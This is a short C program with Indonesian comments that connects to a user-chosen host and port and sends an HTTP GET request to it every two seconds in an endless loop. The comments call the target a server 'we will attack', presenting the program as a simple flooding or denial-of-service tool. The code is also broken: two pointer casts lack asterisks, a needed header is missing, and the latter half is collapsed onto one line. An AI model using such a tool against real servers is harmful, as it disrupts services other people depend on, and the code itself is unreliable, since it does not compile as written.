#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
int main(int argc, char *argv[]) {

    int sockfd, portno;
    struct sockaddr_in serv_addr;

    if (argc != 3) {
        fprintf(stderr,"Usage: %s hostname port\n", argv[0]);
        exit(0);
    }

    portno = atoi(argv[2]);

    // Membuat socket TCP 
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) { 
        perror("ERROR opening socket"); 
        exit(1); 
    }

    // Mengambil alamat IP dari hostname yang diberikan 
    struct hostent *server; 

    server = gethostbyname(argv[1]);

    if (server == NULL) { 
        fprintf(stderr,"ERROR, no such host\n"); 
        exit(0); 
    }

     // Membuat struktur alamat untuk server yang akan kita serang  										   // dengan menggunakan port yang diberikan sebagai argumen  					   // ke program ini.  

     bzero((char *) &serv_addr, sizeof(serv_addr));   serv_addr.sin_family = AF_INET;   bcopy((char *)server->h_addr, (char )&serv_addr.sin_addr.s_addr, server->h_length);   serv_addr.sin_port = htons(portno);   // Melakukan koneksi ke server yang telah kita tentukan sebelumnya     if (connect(sockfd, (struct sockaddr)&serv_addr, sizeof(serv_addr)) < 0)      {          perror("ERROR connecting");          exit(1);      }      else      {          printf("Connected to %s on port %d\n", argv[1], portno);      }       while (1)      {          sendto(sockfd,"GET / HTTP/1.0\r\n\r\n", strlen("GET / HTTP/1.0\r\n\r\n"), 0 , NULL , 0 );          sleep(2);      }       close(sockfd);       return 0; }
